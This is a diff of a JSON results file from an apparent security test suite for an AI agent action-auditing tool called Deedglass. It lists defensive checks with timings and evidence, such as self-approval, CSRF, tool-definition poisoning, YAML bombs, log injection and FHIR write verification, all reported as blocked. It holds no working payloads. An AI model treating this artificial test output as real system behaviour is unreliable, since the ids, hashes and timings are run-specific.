       "evidence": {
         "agent_0": {
           "error.code": "insufficient_scope",
@@ -1377,7 +1377,7 @@
         },
         "exclude": 200,
         "preview_excluded": [
-          "dtx_01m5rya72dn4nv0wg5nzhxn1y3"
+          "dtx_01m5t6w19yyndhkh78vfa8eqjc"
         ],
         "preview_lists_it": true,
         "preview_refusals": [],
@@ -1393,7 +1393,7 @@
       "detail": "REJECTED (context_changed for X's link carrying Y's digest; approval_link_invalid for the voided link); X stays pending and Y gets no vote",
       "status": "matched",
       "line": "context_changed · approval_link_invalid · 0 votes",
-      "ms": 236,
+      "ms": 243,
       "evidence": {
         "voided_link": {
           "error.code": "approval_link_invalid",
@@ -1428,7 +1428,7 @@
       "detail": "REJECTED (a bare 401 for the bad and the stale signature; the replay answers 200 and changes nothing); the approval is decided once",
       "status": "matched",
       "line": "401 · stale 401 · replay no-op · decided once",
-      "ms": 612,
+      "ms": 630,
       "evidence": {
         "after": {
           "status": "approved",
@@ -1462,7 +1462,7 @@
       "detail": "REJECTED (self_approval; the approval stays pending and nothing runs)",
       "status": "matched",
       "line": "self_approval · in Slack · 0 votes",
-      "ms": 198,
+      "ms": 205,
       "evidence": {
         "after": {
           "action_status": "pending_approval",
@@ -1483,7 +1483,7 @@
       "detail": "REJECTED (already_countersigned for the second vote every time); 1 of 2 remains and nothing runs",
       "status": "matched",
       "line": "already_countersigned · 10 of 10 rounds · 1 of 2",
-      "ms": 305,
+      "ms": 324,
       "evidence": {
         "clean_rounds": 10,
         "rounds": [
@@ -1547,40 +1547,6 @@
               "required": 2
             },
             "codes": [
-              "already_countersigned",
-              ""
-            ],
-            "statuses": [
-              409,
-              200
-            ]
-          },
-          {
-            "after": {
-              "action_status": "pending_approval",
-              "approval_status": "pending",
-              "countersigned": 1,
-              "executions": 0,
-              "required": 2
-            },
-            "codes": [
-              "already_countersigned",
-              ""
-            ],
-            "statuses": [
-              409,
-              200
-            ]
-          },
-          {
-            "after": {
-              "action_status": "pending_approval",
-              "approval_status": "pending",
-              "countersigned": 1,
-              "executions": 0,
-              "required": 2
-            },
-            "codes": [
               "",
               "already_countersigned"
             ],
@@ -1632,12 +1598,46 @@
               "required": 2
             },
             "codes": [
-              "already_countersigned",
-              ""
+              "",
+              "already_countersigned"
             ],
             "statuses": [
-              409,
-              200
+              200,
+              409
+            ]
+          },
+          {
+            "after": {
+              "action_status": "pending_approval",
+              "approval_status": "pending",
+              "countersigned": 1,
+              "executions": 0,
+              "required": 2
+            },
+            "codes": [
+              "",
+              "already_countersigned"
+            ],
+            "statuses": [
+              200,
+              409
+            ]
+          },
+          {
+            "after": {
+              "action_status": "pending_approval",
+              "approval_status": "pending",
+              "countersigned": 1,
+              "executions": 0,
+              "required": 2
+            },
+            "codes": [
+              "",
+              "already_countersigned"
+            ],
+            "statuses": [
+              200,
+              409
             ]
           },
           {
@@ -1668,7 +1668,7 @@
       "detail": "REJECTED (approver_not_eligible for approve; insufficient_role for the other three); nothing changes",
       "status": "matched",
       "line": "approver_not_eligible · insufficient_role ×3",
-      "ms": 137,
+      "ms": 148,
       "evidence": {
         "activate": {
           "error.code": "insufficient_role",
@@ -1711,7 +1711,7 @@
       "detail": "REJECTED (csrf_failed); no state change",
       "status": "matched",
       "line": "csrf_failed · no header · another session's token",
-      "ms": 56,
+      "ms": 72,
       "evidence": {
         "agents": [
           11,
@@ -1740,7 +1740,7 @@
       "detail": "REJECTED (no org A event delivered; 0 ids leaked)",
       "status": "matched",
       "line": "0 events from acme · person and admin key",
-      "ms": 5068,
+      "ms": 5080,
       "evidence": {
         "acme_events": 16,
         "acme_ids_seen": 0,
@@ -1752,7 +1752,7 @@
           200,
           200
         ],
-        "last_event_id": "326qq8.17"
+        "last_event_id": "0m1qr4.17"
       }
     },
     {
@@ -1763,7 +1763,7 @@
       "detail": "REJECTED (org_stopped) for every call that starts after stop + 2 s; none executes after",
       "status": "matched",
       "line": "org_stopped · 10 of 10 rounds · 0 executed after stop + 2 s",
-      "ms": 32625,
+      "ms": 32634,
       "evidence": {
         "clean_rounds": 10,
         "rounds": [
@@ -1840,10 +1840,10 @@
             "stop": 200
           },
           {
-            "after_cut": 27,
+            "after_cut": 26,
             "calls": 200,
             "executed_after_cut": "0",
-            "org_stopped": 27,
+            "org_stopped": 26,
             "start": 200,
             "stop": 200
           }
@@ -1858,7 +1858,7 @@
       "detail": "DETECTED (connector.tool_hidden, description_flagged, sealed for each tool); the tools are hidden from tools/list and a call is tool_unknown",
       "status": "matched",
       "line": "hidden from clients · tool_unknown · 3 deeds",
-      "ms": 89,
+      "ms": 153,
       "evidence": {
         "admin_line_logged": true,
         "clean_tool": {
@@ -1886,7 +1886,7 @@
       "detail": "DENIED (tool_unknown: the changed tool is hidden and refused until Deedglass restarts; nothing reaches the upstream); connector.tool_hidden (definition_changed) is sealed",
       "status": "matched",
       "line": "definition changed · hidden · tool_unknown · 1 deed",
-      "ms": 500,
+      "ms": 559,
       "evidence": {
         "after": [
           "read_file"
@@ -1909,7 +1909,7 @@
       "detail": "REJECTED (validation_failed for the unqualified name read_file); each qualified name reaches only its own upstream",
       "status": "matched",
       "line": "validation_failed · qualified names only",
-      "ms": 81,
+      "ms": 92,
       "evidence": {
         "bare": {
           "action": "",
@@ -1938,8 +1938,8 @@
       "actual": "BLOCKED",
       "detail": "BLOCKED (too_large for the 50 MiB result, read no further than 4 MiB; upstream_error for the 10,000-deep result); reported as unknown, never as executed; the action is sealed; server memory grows < 64 MiB",
       "status": "matched",
-      "line": "too_large · upstream_error · unknown · +9 MiB",
-      "ms": 320,
+      "line": "too_large · upstream_error · unknown · +1 MiB",
+      "ms": 333,
       "evidence": {
         "big": {
           "code": "too_large",
@@ -1951,8 +1951,8 @@
           "execution": "unknown",
           "state": "sealed"
         },
-        "ms": 244,
-        "server_rss_growth_mib": "8.9"
+        "ms": 256,
+        "server_rss_growth_mib": "1.3"
       }
     },
     {
@@ -1963,7 +1963,7 @@
       "detail": "BLOCKED (connector_unavailable for a server that is down; timeout for one that hangs); nothing reported as executed",
       "status": "matched",
       "line": "connector_unavailable · timeout · unknown",
-      "ms": 6073,
+      "ms": 6074,
       "evidence": {
         "down": {
           "action": "",
@@ -1986,7 +1986,7 @@
       "detail": "BLOCKED (answered with a JSON-RPC error and never relayed to the client unless --allow-server-requests names the method; logged)",
       "status": "matched",
       "line": "sampling and elicitation refused · roots/list passed · logged",
-      "ms": 4067,
+      "ms": 4073,
       "evidence": {
         "client_saw": [
           "roots/list"
@@ -2033,7 +2033,7 @@
       "detail": "BLOCKED (destination blocked at delivery, 0 dials; a redirect is never followed, 0 hits on its target)",
       "status": "matched",
       "line": "destination blocked at delivery · redirect not followed · 0 hits",
-      "ms": 73,
+      "ms": 82,
       "evidence": {
         "rebind": {
           "create": 201,
@@ -2058,8 +2058,8 @@
       "actual": "REJECTED",
       "detail": "REJECTED (policy_invalid: yaml_alias and yaml_too_complex; request_too_large for 10^6 nodes and the 20 MiB file) in < 200 ms; server memory grows < 64 MiB",
       "status": "matched",
-      "line": "yaml_alias · yaml_too_complex · 413 ×2 · ≤ 22 ms · +1 MiB",
-      "ms": 135,
+      "line": "yaml_alias · yaml_too_complex · 413 ×2 · ≤ 20 ms · +0 MiB",
+      "ms": 146,
       "evidence": {
         "1e6_nodes": {
           "diagnostics": null,
@@ -2071,7 +2071,7 @@
         "20_mib": {
           "diagnostics": null,
           "error.code": "request_too_large",
-          "ms": 18,
+          "ms": 19,
           "rss_mib": "0.0",
           "status": 413
         },
@@ -2080,8 +2080,8 @@
             "yaml_too_complex"
           ],
           "error.code": "policy_invalid",
-          "ms": 22,
-          "rss_mib": "1.4",
+          "ms": 20,
+          "rss_mib": "0.0",
           "status": 400
         },
         "aliases": {
@@ -2102,8 +2102,8 @@
       "actual": "REJECTED",
       "detail": "REJECTED (policy_invalid: cel_nesting and cel_cost at lint); at run time the rule stops at its limit and the action is denied, never allowed",
       "status": "matched",
-      "line": "cel_nesting · cel_cost at lint · 20,000 items: policy_unavailable in 96 ms",
-      "ms": 254,
+      "line": "cel_nesting · cel_cost at lint · 20,000 items: policy_unavailable in 95 ms",
+      "ms": 267,
       "evidence": {
         "lint_cost": {
           "diagnostics": [
@@ -2123,8 +2123,8 @@
           "decision": "deny",
           "error.code": "policy_unavailable",
           "message": "Deedglass could not evaluate the policy for this action, so it did not run. An admin can check Console › Policies.",
-          "ms": 96,
-          "rss_mib": "4.0",
+          "ms": 95,
+          "rss_mib": "0.5",
           "rule": "unavailable",
           "status": 403
         },
@@ -2143,10 +2143,10 @@
       "detail": "DETECTED (the database refuses the second child through UNIQUE (org_id, prev_hash); deedglass verify reports chain_prev_hash_mismatch or chain_seq_out_of_order at seq N)",
       "status": "matched",
       "line": "fork refused (23505) · chain_prev_hash_mismatch",
-      "ms": 230,
+      "ms": 251,
       "evidence": {
         "export": {
-          "anchor": "2545:sha256:5d459105bd5499c072a230831894728e57b02a921164c961acfc0f625938e325",
+          "anchor": "2545:sha256:946d74670d81251eaa07595f705542bb1f160497a776a990abc6147138558638",
           "deeds": 2548,
           "status": 200
         },
@@ -2161,12 +2161,12 @@
         },
         "verify_intact": {
           "exit": 0,
-          "out": "{\n  \"object\": \"verification_report\",\n  \"result\": \"valid\",\n  \"deeds\": 2548,\n  \"intact\": 2548,\n  \"org\": \"org_01m5ry6sfekj4sgyxjk1640pv8\",\n  \"first_seq\": 1,\n  \"last_seq\": 2548,\n  \"from\": \"2026-10-25T07:08:10.608Z\",\n  \"to\": \"2026-10-25T07:11:01.561Z\",\n  \"chain\": {\n    \"status\": \"intact\",\n    \"anchor\": {…"
+          "out": "{\n  \"object\": \"verification_report\",\n  \"result\": \"valid\",\n  \"deeds\": 2548,\n  \"intact\": 2548,\n  \"org\": \"org_01m5t6rkb4b49qcw1xzqzprd24\",\n  \"first_seq\": 1,\n  \"last_seq\": 2548,\n  \"from\": \"2026-10-25T18:56:57.191Z\",\n  \"to\": \"2026-10-25T18:59:48.366Z\",\n  \"chain\": {\n    \"status\": \"intact\",\n    \"anchor\": {…"
         },
         "verify_spliced": {
           "code": "chain_prev_hash_mismatch",
           "exit": 1,
-          "out": "{\n  \"object\": \"verification_report\",\n  \"result\": \"invalid\",\n  \"deeds\": 1,\n  \"intact\": 0,\n  \"org\": null,\n  \"first_seq\": null,\n  \"last_seq\": null,\n  \"from\": null,\n  \"to\": null,\n  \"chain\": {\n    \"status\": \"broken\",\n    \"anchor\": {\n      \"kind\": \"deed\",\n      \"seq\": 2545,\n      \"body_hash\": \"sha256:5d459105bd5499c072a230831894728e57b02a921164c961acfc0f625938e325\"\n    }\n  },\n  \"seal_keys\": [],\n  \"keys_…"
+          "out": "{\n  \"object\": \"verification_report\",\n  \"result\": \"invalid\",\n  \"deeds\": 1,\n  \"intact\": 0,\n  \"org\": null,\n  \"first_seq\": null,\n  \"last_seq\": null,\n  \"from\": null,\n  \"to\": null,\n  \"chain\": {\n    \"status\": \"broken\",\n    \"anchor\": {\n      \"kind\": \"deed\",\n      \"seq\": 2545,\n      \"body_hash\": \"sha256:946d74670d81251eaa07595f705542bb1f160497a776a990abc6147138558638\"\n    }\n  },\n  \"seal_keys\": [],\n  \"keys_…"
         }
       }
     },
@@ -2227,7 +2227,7 @@
       "detail": "REJECTED (request_too_large for 1 MiB + 1; validation_failed for args 129 deep and the 10,000-deep body) in < 200 ms; server memory grows < 64 MiB",
       "status": "matched",
       "line": "413 · validation_failed ×2 · ≤ 0 ms · +0 MiB",
-      "ms": 76,
+      "ms": 91,
       "evidence": {
         "1mib_plus_1": {
           "error.code": "request_too_large",
@@ -2260,7 +2260,7 @@
       "detail": "REDACTED (control characters escaped in every sink; 0 raw ESC bytes)",
       "status": "matched",
       "line": "0 raw control bytes in 7 sinks · 0 forged log lines",
-      "ms": 2185,
+      "ms": 2195,
       "evidence": {
         "action": "succeeded",
         "bad_tool": {
@@ -2271,7 +2271,7 @@
           "error.code": "tool_unknown",
           "status": 404
         },
-        "cli_show_head": "fake.echo · attacker · 2026-10-25 07:11:03 UTC\n  decision   allow · rule allow-reads · pv_01m5ry6s…\n  execution  executed · 0 ms\n  check      Claimed · Matches · reported\n             ✓ Claimed  The tool reported success.\n  record     seq 2,559 · deed_01m5ryc2… · sealed with sk_01m5ry…",
+        "cli_show_head": "fake.echo · attacker · 2026-10-25 18:59:50 UTC\n  decision   allow · rule allow-reads · pv_01m5t6rk…\n  execution  executed · 0 ms\n  check      Claimed · Matches · reported\n             ✓ Claimed  The tool reported success.\n  record     seq 2,559 · deed_01m5t6xw… · sealed with sk_01m5t6…",
         "forged_log_lines": 0,
         "raw_control_bytes": {
           "api_action": 0,
@@ -2292,7 +2292,7 @@
       "detail": "MISMATCH at L1 (fhir_conditional_matched: the server returned an existing resource version and this action created none; never VERIFIED)",
       "status": "matched",
       "line": "fhir_conditional_matched · HTTP 200 · 0 versions written",
-      "ms": 94,
+      "ms": 100,
       "evidence": {
         "codes": [
           "fhir_conditional_matched"
@@ -2314,7 +2314,7 @@
       "detail": "VERIFIED at L1 (the fields match) with the note fhir_no_new_version naming the unchanged version; the record never shows a new version",
       "status": "matched",
       "line": "fhir_no_new_version · version 1 kept",
-      "ms": 79,
+      "ms": 85,
       "evidence": {
         "codes": [
           "readback_matched",
@@ -2337,7 +2337,7 @@
       "detail": "MISMATCH at L1 (fhir_field_changed with the field's path; server-added meta and generated narrative don't count)",
       "status": "matched",
       "line": "fhir_field_changed · status · tag and narrative ignored",
-      "ms": 82,
+      "ms": 92,
       "evidence": {
         "codes": [
           "fhir_field_changed"
@@ -2356,7 +2356,7 @@
       "detail": "UNVERIFIABLE (the action is unknown; fhir_history_no_match names the gap); never VERIFIED and never MISMATCH",
       "status": "matched",
       "line": "unknown · fhir_history_no_match · the server committed 1 version",
-      "ms": 85,
+      "ms": 94,
       "evidence": {
         "codes": [
           "fhir_history_no_match"
@@ -2377,7 +2377,7 @@
       "detail": "DETECTED (the other writer's version is reported as out_of_band and isn't bound to the action; the action's verdict comes from its own transaction only)",
       "status": "matched",
       "line": "out_of_band · 1 unattributed transaction · the action's own VERIFIED at L2",
-      "ms": 449,
+      "ms": 473,
       "evidence": {
         "codes": [
           "version_matched",
@@ -2391,7 +2391,7 @@
           ],
           [
             "bound",
-            "act_01m5ryc7aapd77yyp2sjfg3s1w",
+            "act_01m5t6y1h59ayhkcsy1qq0cmcq",
             "old_image_missing:public.hfj_res_ver,old_image_missing:public.hfj_resource"
           ]
         ],
@@ -2409,7 +2409,7 @@
       "detail": "DETECTED (the version is reported as request_id_reused and is never bound: binding needs the version the server reported to this action, so the forged version never makes the action VERIFIED)",
       "status": "matched",
       "line": "request_id_reused · decoder.alert · never bound; the action's own transaction judged",
-      "ms": 98,
+      "ms": 103,
       "evidence": {
         "alert": true,
         "codes": [
@@ -2419,12 +2419,12 @@
         "frames": [
           [
             "request_id_reused",
-            "act_01m5ryc7wfecjqm6ht9y7jezqg",
+            "act_01m5t6y23gbqkt96q719qpgrh4",
             "old_image_missing:public.hfj_res_ver"
           ],
           [
             "bound",
-            "act_01m5ryc7wfecjqm6ht9y7jezqg",
+            "act_01m5t6y23gbqkt96q719qpgrh4",
             "old_image_missing:public.hfj_res_ver"
           ]
         ],
@@ -2439,15 +2439,15 @@
       "actual": "MISMATCH",
       "detail": "MISMATCH at L2 (fhir_extra_versions: the action's transaction committed 2 resource versions, the call reported 1; the extra resource is named)",
       "status": "matched",
-      "line": "fhir_extra_versions · Patient/ghost-706376000 committed in the same transaction",
-      "ms": 86,
+      "line": "fhir_extra_versions · Patient/ghost-663382000 committed in the same transaction",
+      "ms": 97,
       "evidence": {
         "codes": [
           "fhir_extra_versions",
           "version_matched"
         ],
         "level": "L2",
-        "message": "This action's transaction committed 2 resource versions, and the call reported 1. Also written: Patient/ghost-706376000 version 1.",
+        "message": "This action's transaction committed 2 resource versions, and the call reported 1. Also written: Patient/ghost-663382000 version 1.",
         "verdict": "MISMATCH"
       }
     },
@@ -2459,7 +2459,7 @@
       "detail": "UNVERIFIABLE (L2 gap large_object_not_replicated); never MISMATCH and never VERIFIED",
       "status": "matched",
       "line": "large_object_not_replicated · L1 matched, L2 can't compare",
-      "ms": 88,
+      "ms": 102,
       "evidence": {
         "l1": [
           "level_below_required",
@@ -2480,7 +2480,7 @@
       "detail": "NO EFFECT (fhir_version_conflict: the action is sealed as failed, isn't retried, and no version is created or claimed)",
       "status": "matched",
       "line": "fhir_version_conflict · HTTP 409 · sent once",
-      "ms": 101,
+      "ms": 125,
       "evidence": {
         "failed": "",
         "sent": 1,
@@ -2499,7 +2499,7 @@
       "detail": "DENIED (no request leaves; a deed with decision deny is sealed; the server's history is unchanged)",
       "status": "matched",
       "line": "default deny · 0 requests to the server",
-      "ms": 64,
+      "ms": 77,
       "evidence": {
         "denied": "",
         "hits": [
@@ -2517,7 +2517,7 @@
       "detail": "REDACTED (once the action is sealed the planted values appear in no action row, deed, event, export or log line of the org; only ids and digests remain)",
       "status": "matched",
       "line": "3 planted values · 0 hits in 39 tables, the export and the log",
-      "ms": 1589,
+      "ms": 1148,
       "evidence": {
         "digests_shown": true,
         "export": {
@@ -2542,7 +2542,7 @@
       "detail": "DENIED (the pack's no-delete-clinical rule; no request leaves; the deed names the rule)",
       "status": "matched",
       "line": "no-delete-clinical · 0 requests to the server · the Observation is still there",
-      "ms": 155,
+      "ms": 196,
       "evidence": {
         "denied": "",
         "hits": [
@@ -2562,8 +2562,8 @@
   "invariants": {
     "chains": "intact",
     "secrets_seen": 0,
-    "log_lines": 7799,
-    "rows_scanned": 18989,
+    "log_lines": 7780,
+    "rows_scanned": 18992,
     "bodies_seen": 9313
   }
 }
